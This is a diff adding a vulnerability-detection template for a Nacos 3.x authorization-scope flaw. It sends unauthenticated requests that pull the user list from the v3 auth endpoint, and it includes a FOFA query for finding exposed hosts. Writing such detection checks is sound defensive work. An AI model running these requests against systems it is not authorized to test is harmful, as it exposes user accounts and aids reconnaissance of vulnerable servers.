@@ -1,0 +1,46 @@
+id: nacos-v3-auth-scope
+
+info:
+  name: Nacos 3.x 鉴权作用域错配（未授权用户列表）
+  author: argus
+  severity: high
+  description: |
+    Nacos 3.0.0～3.2.3：User/Role/Permission 的 v3 接口默认 apiType=OPEN_API，
+    走 nacos.core.auth.enabled（默认关），即使用户开了 admin/console 鉴权，
+    无凭证也能打 8848 上的 /nacos/v3/auth/*。3.2.4 给注解补上 ADMIN_API。
+    本规则只读：无凭证 GET /nacos/v3/auth/user/list 返回 200 且 JSON code=0 带 pageItems，
+    同时 GET /nacos/v3/admin/cs/config/list 仍 403。不建号、不发权、不写配置。
+    把 nacos.core.auth.enabled 打开会挡住 OPEN_API，本条不报（不是误报）。
+  reference:
+    - https://github.com/mhtsec/nacos-authscope-poc
+    - https://github.com/alibaba/nacos/releases/tag/3.2.4
+  metadata:
+    max-request: 4
+    product: Alibaba-Nacos
+    affected: 3.0.0-3.2.3
+    fixed: 3.2.4
+    fofa-query: app="NACOS"
+  tags: nacos,auth,unauth,alibaba
+
+http:
+  - raw:
+      - |
+        GET {{prefix}}/v3/auth/user/list?pageNo=1&pageSize=10 HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET {{prefix}}/v3/admin/cs/config/list?pageNo=1&pageSize=10 HTTP/1.1
+        Host: {{Hostname}}
+
+    payloads:
+      prefix:
+        - "/nacos"
+        - ""
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_1 == 200 && contains(body_1, "\"code\":0") && contains(body_1, "pageItems") && contains(body_1, "success")'
+          - 'status_code_2 == 403 && contains(body_2, "access denied")'
+        condition: and
